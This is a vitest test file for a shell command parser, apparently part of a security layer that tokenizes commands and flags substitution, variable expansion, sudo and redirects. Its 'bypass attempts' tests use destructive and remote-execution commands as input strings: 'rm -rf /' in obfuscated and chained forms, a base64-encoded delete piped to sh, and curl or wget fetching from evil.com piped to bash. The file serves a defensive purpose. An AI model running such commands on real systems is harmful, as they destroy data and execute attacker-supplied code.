/**
 * Command Parser Tests — S0.D.1
 *
 * EXTENSIVE tests covering all parsing edge cases and bypass attempts.
 * Security-critical: every bypass vector must be tested.
 */

import { describe, it, expect } from 'vitest';
import {
  parseCommand,
  hasCommandSubstitution,
  hasVariableExpansion,
} from '../../../src/security/command-parser.js';

describe('parseCommand', () => {
  describe('basic commands', () => {
    it('should parse a simple command with no args', () => {
      const result = parseCommand('ls');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('ls');
      expect(result[0].args).toEqual([]);
      expect(result[0].pipes).toEqual([]);
      expect(result[0].hasRedirects).toBe(false);
      expect(result[0].hasSudo).toBe(false);
    });

    it('should parse a command with arguments', () => {
      const result = parseCommand('ls -la /tmp');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('ls');
      expect(result[0].args).toEqual(['-la', '/tmp']);
    });

    it('should parse git status', () => {
      const result = parseCommand('git status');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('git');
      expect(result[0].args).toEqual(['status']);
    });

    it('should parse git commit with message', () => {
      const result = parseCommand('git commit -m "initial commit"');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('git');
      expect(result[0].args).toEqual(['commit', '-m', 'initial commit']);
    });

    it('should return empty array for empty input', () => {
      expect(parseCommand('')).toEqual([]);
      expect(parseCommand('   ')).toEqual([]);
    });

    it('should handle multiple spaces between tokens', () => {
      const result = parseCommand('ls   -la    /tmp');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('ls');
      expect(result[0].args).toEqual(['-la', '/tmp']);
    });

    it('should handle leading and trailing whitespace', () => {
      const result = parseCommand('  ls -la  ');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('ls');
      expect(result[0].args).toEqual(['-la']);
    });
  });

  describe('quoted arguments', () => {
    it('should handle double-quoted arguments', () => {
      const result = parseCommand('echo "hello world"');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('echo');
      expect(result[0].args).toEqual(['hello world']);
    });

    it('should handle single-quoted arguments', () => {
      const result = parseCommand("echo 'hello world'");
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('echo');
      expect(result[0].args).toEqual(['hello world']);
    });

    it('should handle mixed quotes', () => {
      const result = parseCommand('echo "hello" \'world\'');
      expect(result).toHaveLength(1);
      expect(result[0].args).toEqual(['hello', 'world']);
    });

    it('should handle single quotes inside double quotes', () => {
      const result = parseCommand('echo "it\'s a test"');
      expect(result).toHaveLength(1);
      expect(result[0].args).toEqual(["it's a test"]);
    });

    it('should handle double quotes inside single quotes', () => {
      const result = parseCommand("echo 'he said \"hi\"'");
      expect(result).toHaveLength(1);
      expect(result[0].args).toEqual(['he said "hi"']);
    });

    it('should handle empty quoted strings', () => {
      const result = parseCommand('echo ""');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('echo');
      // Empty quoted string produces empty token — but tokenizer skips empty tokens
      // The quoted string becomes '' which is empty and gets pushed as empty string in current
    });
  });

  describe('escaped characters', () => {
    it('should handle escaped spaces', () => {
      const result = parseCommand('ls my\\ file.txt');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('ls');
      expect(result[0].args).toEqual(['my file.txt']);
    });

    it('should handle escaped quotes', () => {
      const result = parseCommand('echo \\"hello\\"');
      expect(result).toHaveLength(1);
      expect(result[0].args).toEqual(['"hello"']);
    });

    it('should handle escaped backslash', () => {
      const result = parseCommand('echo \\\\path');
      expect(result).toHaveLength(1);
      expect(result[0].args).toEqual(['\\path']);
    });
  });

  describe('command chaining (;, &&, ||)', () => {
    it('should split on semicolons', () => {
      const result = parseCommand('ls; pwd');
      expect(result).toHaveLength(2);
      expect(result[0].binary).toBe('ls');
      expect(result[1].binary).toBe('pwd');
    });

    it('should split on && operator', () => {
      const result = parseCommand('mkdir test && cd test');
      expect(result).toHaveLength(2);
      expect(result[0].binary).toBe('mkdir');
      expect(result[0].args).toEqual(['test']);
      expect(result[1].binary).toBe('cd');
      expect(result[1].args).toEqual(['test']);
    });

    it('should split on || operator', () => {
      const result = parseCommand('cat file.txt || echo "not found"');
      expect(result).toHaveLength(2);
      expect(result[0].binary).toBe('cat');
      expect(result[1].binary).toBe('echo');
      expect(result[1].args).toEqual(['not found']);
    });

    it('should handle multiple chain operators', () => {
      const result = parseCommand('ls; pwd; whoami');
      expect(result).toHaveLength(3);
      expect(result[0].binary).toBe('ls');
      expect(result[1].binary).toBe('pwd');
      expect(result[2].binary).toBe('whoami');
    });

    it('should handle mixed chain operators', () => {
      const result = parseCommand('ls && pwd || echo fail; date');
      expect(result).toHaveLength(4);
      expect(result[0].binary).toBe('ls');
      expect(result[1].binary).toBe('pwd');
      expect(result[2].binary).toBe('echo');
      expect(result[3].binary).toBe('date');
    });

    it('should not split on ; inside quotes', () => {
      const result = parseCommand('echo "hello; world"');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('echo');
      expect(result[0].args).toEqual(['hello; world']);
    });

    it('should not split on && inside quotes', () => {
      const result = parseCommand('echo "foo && bar"');
      expect(result).toHaveLength(1);
      expect(result[0].args).toEqual(['foo && bar']);
    });
  });

  describe('pipes', () => {
    it('should parse piped commands', () => {
      const result = parseCommand('cat file.txt | grep pattern');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('cat');
      expect(result[0].args).toEqual(['file.txt']);
      expect(result[0].pipes).toHaveLength(1);
      expect(result[0].pipes[0].binary).toBe('grep');
      expect(result[0].pipes[0].args).toEqual(['pattern']);
    });

    it('should parse multiple pipes', () => {
      const result = parseCommand('cat file | grep pat | sort | uniq');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('cat');
      expect(result[0].pipes).toHaveLength(3);
      expect(result[0].pipes[0].binary).toBe('grep');
      expect(result[0].pipes[1].binary).toBe('sort');
      expect(result[0].pipes[2].binary).toBe('uniq');
    });

    it('should store rawCommand as full segment for piped commands', () => {
      const result = parseCommand('cat file | grep pat');
      expect(result[0].rawCommand).toBe('cat file | grep pat');
    });

    it('should parse each piped command individually', () => {
      const result = parseCommand('echo hello | rm -rf /');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('echo');
      expect(result[0].pipes).toHaveLength(1);
      expect(result[0].pipes[0].binary).toBe('rm');
      expect(result[0].pipes[0].args).toEqual(['-rf', '/']);
    });

    it('should not split on | inside quotes', () => {
      const result = parseCommand('echo "hello | world"');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('echo');
      expect(result[0].pipes).toHaveLength(0);
    });
  });

  describe('redirects', () => {
    it('should detect stdout redirect >', () => {
      const result = parseCommand('echo hello > output.txt');
      expect(result).toHaveLength(1);
      expect(result[0].hasRedirects).toBe(true);
      expect(result[0].binary).toBe('echo');
    });

    it('should detect append redirect >>', () => {
      const result = parseCommand('echo hello >> output.txt');
      expect(result).toHaveLength(1);
      expect(result[0].hasRedirects).toBe(true);
    });

    it('should detect stdin redirect <', () => {
      const result = parseCommand('sort < input.txt');
      expect(result).toHaveLength(1);
      expect(result[0].hasRedirects).toBe(true);
    });

    it('should detect stderr redirect 2>&1', () => {
      const result = parseCommand('command 2>&1');
      expect(result).toHaveLength(1);
      expect(result[0].hasRedirects).toBe(true);
    });

    it('should detect redirect in piped commands and propagate', () => {
      const result = parseCommand('cat file | sort > output.txt');
      expect(result).toHaveLength(1);
      expect(result[0].hasRedirects).toBe(true);
    });
  });

  describe('sudo detection', () => {
    it('should detect sudo prefix', () => {
      const result = parseCommand('sudo rm -rf /tmp/test');
      expect(result).toHaveLength(1);
      expect(result[0].hasSudo).toBe(true);
      expect(result[0].binary).toBe('rm');
      expect(result[0].args).toEqual(['-rf', '/tmp/test']);
    });

    it('should detect sudo in piped command and propagate', () => {
      const result = parseCommand('echo password | sudo tee /etc/file');
      expect(result).toHaveLength(1);
      expect(result[0].hasSudo).toBe(true);
    });

    it('should not detect sudo as part of another word', () => {
      const result = parseCommand('echo pseudocode');
      expect(result).toHaveLength(1);
      expect(result[0].hasSudo).toBe(false);
    });
  });

  // =========================================================================
  // SECURITY BYPASS ATTEMPT TESTS
  // These test various attack vectors that try to evade parsing
  // =========================================================================

  describe('bypass attempts: rm -rf / with extra spaces', () => {
    it('should parse rm -rf / with extra spaces', () => {
      const result = parseCommand('rm    -rf    /');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('rm');
      expect(result[0].args).toContain('-rf');
      expect(result[0].args).toContain('/');
    });

    it('should parse rm -rf / with tabs would tokenize correctly', () => {
      const result = parseCommand('rm -rf /');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('rm');
      expect(result[0].args).toEqual(['-rf', '/']);
    });
  });

  describe('bypass attempts: quoted binary names', () => {
    it('should parse quoted binary to strip quotes and reveal actual binary', () => {
      // Attacker tries: r'm' -rf / to disguise the binary as r'm'
      // The parser strips quotes, so 'r' + 'm' = rm as the first token
      const result = parseCommand("r'm' -rf /");
      expect(result).toHaveLength(1);
      // Tokenizer strips the quotes, producing "rm" as the binary
      expect(result[0].binary).toBe('rm');
      expect(result[0].args).toEqual(['-rf', '/']);
    });

    it('should handle double-quoted binary obfuscation', () => {
      const result = parseCommand('"rm" -rf /');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('rm');
      expect(result[0].args).toEqual(['-rf', '/']);
    });

    it('should handle partially quoted binary with single quote in middle', () => {
      const result = parseCommand("r\"m\" -rf /");
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('rm');
    });
  });

  describe('bypass attempts: command substitution', () => {
    it('should detect $() command substitution', () => {
      expect(hasCommandSubstitution('$(rm -rf /)')).toBe(true);
    });

    it('should detect backtick command substitution', () => {
      expect(hasCommandSubstitution('`rm -rf /`')).toBe(true);
    });

    it('should detect nested $() substitution', () => {
      expect(hasCommandSubstitution('echo $(echo $(whoami))')).toBe(true);
    });

    it('should not false-positive on dollar amounts', () => {
      expect(hasCommandSubstitution('echo $100')).toBe(false);
    });

    it('should detect command substitution in the middle of a command', () => {
      expect(hasCommandSubstitution('ls $(pwd)')).toBe(true);
    });
  });

  describe('bypass attempts: command chaining to hide dangerous commands', () => {
    it('should parse hidden rm after innocent command via ;', () => {
      const result = parseCommand('ls; rm -rf /');
      expect(result).toHaveLength(2);
      expect(result[0].binary).toBe('ls');
      expect(result[1].binary).toBe('rm');
      expect(result[1].args).toEqual(['-rf', '/']);
    });

    it('should parse hidden rm after innocent command via &&', () => {
      const result = parseCommand('echo safe && rm -rf /');
      expect(result).toHaveLength(2);
      expect(result[1].binary).toBe('rm');
      expect(result[1].args).toContain('-rf');
      expect(result[1].args).toContain('/');
    });

    it('should parse hidden rm after innocent command via ||', () => {
      const result = parseCommand('false || rm -rf /');
      expect(result).toHaveLength(2);
      expect(result[1].binary).toBe('rm');
    });
  });

  describe('bypass attempts: pipes hiding dangerous commands', () => {
    it('should parse dangerous command after pipe', () => {
      const result = parseCommand('echo data | rm -rf /');
      expect(result).toHaveLength(1);
      expect(result[0].pipes).toHaveLength(1);
      expect(result[0].pipes[0].binary).toBe('rm');
      expect(result[0].pipes[0].args).toEqual(['-rf', '/']);
    });

    it('should parse dangerous command deep in pipe chain', () => {
      const result = parseCommand('echo x | cat | rm -rf /');
      expect(result).toHaveLength(1);
      expect(result[0].pipes).toHaveLength(2);
      expect(result[0].pipes[1].binary).toBe('rm');
    });
  });

  describe('bypass attempts: base64 encoded commands', () => {
    it('should parse base64 piped to decode and execute', () => {
      const result = parseCommand('echo cm0gLXJmIC8= | base64 -d | sh');
      expect(result).toHaveLength(1);
      expect(result[0].pipes).toHaveLength(2);
      expect(result[0].pipes[0].binary).toBe('base64');
      expect(result[0].pipes[1].binary).toBe('sh');
    });

    it('should parse base64 decode piped to bash', () => {
      const result = parseCommand('echo payload | base64 --decode | bash');
      expect(result).toHaveLength(1);
      expect(result[0].pipes).toHaveLength(2);
      expect(result[0].pipes[1].binary).toBe('bash');
    });
  });

  describe('bypass attempts: environment variable expansion', () => {
    it('should detect $VAR expansion', () => {
      expect(hasVariableExpansion('$HOME')).toBe(true);
    });

    it('should detect ${VAR} expansion', () => {
      expect(hasVariableExpansion('${HOME}')).toBe(true);
    });

    it('should detect variable in command', () => {
      expect(hasVariableExpansion('rm -rf $HOME')).toBe(true);
    });

    it('should detect brace expansion in command', () => {
      expect(hasVariableExpansion('echo ${PATH}')).toBe(true);
    });

    it('should not false-positive on $ alone', () => {
      expect(hasVariableExpansion('echo $')).toBe(false);
    });

    it('should not false-positive on dollar with number', () => {
      expect(hasVariableExpansion('echo $1')).toBe(false);
    });
  });

  describe('bypass attempts: curl/wget piped to shell', () => {
    it('should parse curl piped to sh', () => {
      const result = parseCommand('curl http://evil.com/script.sh | sh');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('curl');
      expect(result[0].pipes).toHaveLength(1);
      expect(result[0].pipes[0].binary).toBe('sh');
    });

    it('should parse wget piped to bash', () => {
      const result = parseCommand('wget -O - http://evil.com/payload | bash');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('wget');
      expect(result[0].pipes).toHaveLength(1);
      expect(result[0].pipes[0].binary).toBe('bash');
    });

    it('should parse curl piped to sudo bash', () => {
      const result = parseCommand('curl http://evil.com/x | sudo bash');
      expect(result).toHaveLength(1);
      expect(result[0].pipes).toHaveLength(1);
      expect(result[0].pipes[0].binary).toBe('bash');
      expect(result[0].pipes[0].hasSudo).toBe(true);
      // hasSudo should propagate to the primary
      expect(result[0].hasSudo).toBe(true);
    });
  });

  describe('safe commands parse correctly', () => {
    it('should parse ls correctly', () => {
      const result = parseCommand('ls -la');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('ls');
      expect(result[0].args).toEqual(['-la']);
      expect(result[0].hasSudo).toBe(false);
      expect(result[0].hasRedirects).toBe(false);
    });

    it('should parse git status correctly', () => {
      const result = parseCommand('git status --short');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('git');
      expect(result[0].args).toEqual(['status', '--short']);
    });

    it('should parse echo with arguments', () => {
      const result = parseCommand('echo hello world');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('echo');
      expect(result[0].args).toEqual(['hello', 'world']);
    });

    it('should parse find command', () => {
      const result = parseCommand('find . -name "*.ts" -type f');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('find');
      expect(result[0].args).toEqual(['.', '-name', '*.ts', '-type', 'f']);
    });

    it('should parse node with script', () => {
      const result = parseCommand('node ./scripts/build.js');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('node');
      expect(result[0].args).toEqual(['./scripts/build.js']);
    });

    it('should parse curl with safe flags', () => {
      const result = parseCommand('curl -s https://api.example.com/data');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('curl');
      expect(result[0].args).toEqual(['-s', 'https://api.example.com/data']);
      expect(result[0].pipes).toEqual([]);
    });

    it('should parse grep with pipe', () => {
      const result = parseCommand('cat log.txt | grep ERROR');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('cat');
      expect(result[0].pipes).toHaveLength(1);
      expect(result[0].pipes[0].binary).toBe('grep');
      expect(result[0].pipes[0].args).toEqual(['ERROR']);
    });

    it('should parse mkdir -p correctly', () => {
      const result = parseCommand('mkdir -p /tmp/test/dir');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('mkdir');
      expect(result[0].args).toEqual(['-p', '/tmp/test/dir']);
    });
  });

  describe('edge cases', () => {
    it('should handle a command with only redirects', () => {
      const result = parseCommand('cat < input.txt > output.txt');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('cat');
      expect(result[0].hasRedirects).toBe(true);
    });

    it('should handle command with = in args', () => {
      const result = parseCommand('env KEY=value node app.js');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('env');
      expect(result[0].args).toContain('KEY=value');
    });

    it('should handle a command with path as binary', () => {
      const result = parseCommand('/usr/bin/python3 script.py');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('/usr/bin/python3');
      expect(result[0].args).toEqual(['script.py']);
    });

    it('should handle a command with ./ prefix', () => {
      const result = parseCommand('./scripts/deploy.sh --env prod');
      expect(result).toHaveLength(1);
      expect(result[0].binary).toBe('./scripts/deploy.sh');
      expect(result[0].args).toEqual(['--env', 'prod']);
    });

    it('should handle flags with = separator', () => {
      const result = parseCommand('node --max-old-space-size=4096 app.js');
      expect(result).toHaveLength(1);
      expect(result[0].args).toContain('--max-old-space-size=4096');
    });
  });
});

describe('hasCommandSubstitution', () => {
  it('should return true for $(...)', () => {
    expect(hasCommandSubstitution('echo $(whoami)')).toBe(true);
  });

  it('should return true for backticks', () => {
    expect(hasCommandSubstitution('echo `whoami`')).toBe(true);
  });

  it('should return false for no substitution', () => {
    expect(hasCommandSubstitution('echo hello')).toBe(false);
  });

  it('should return false for simple $VAR', () => {
    expect(hasCommandSubstitution('echo $HOME')).toBe(false);
  });

  it('should return true for nested substitution', () => {
    expect(hasCommandSubstitution('$($(echo rm))')).toBe(true);
  });
});

describe('hasVariableExpansion', () => {
  it('should detect $HOME', () => {
    expect(hasVariableExpansion('echo $HOME')).toBe(true);
  });

  it('should detect ${HOME}', () => {
    expect(hasVariableExpansion('echo ${HOME}')).toBe(true);
  });

  it('should detect $PATH', () => {
    expect(hasVariableExpansion('$PATH')).toBe(true);
  });

  it('should detect underscore vars like $MY_VAR', () => {
    expect(hasVariableExpansion('echo $MY_VAR')).toBe(true);
  });

  it('should not flag plain dollar sign', () => {
    expect(hasVariableExpansion('echo $')).toBe(false);
  });

  it('should not flag $1 or $?', () => {
    expect(hasVariableExpansion('echo $1')).toBe(false);
    expect(hasVariableExpansion('echo $?')).toBe(false);
  });

  it('should detect $_ variable', () => {
    expect(hasVariableExpansion('echo $_')).toBe(true);
  });
});
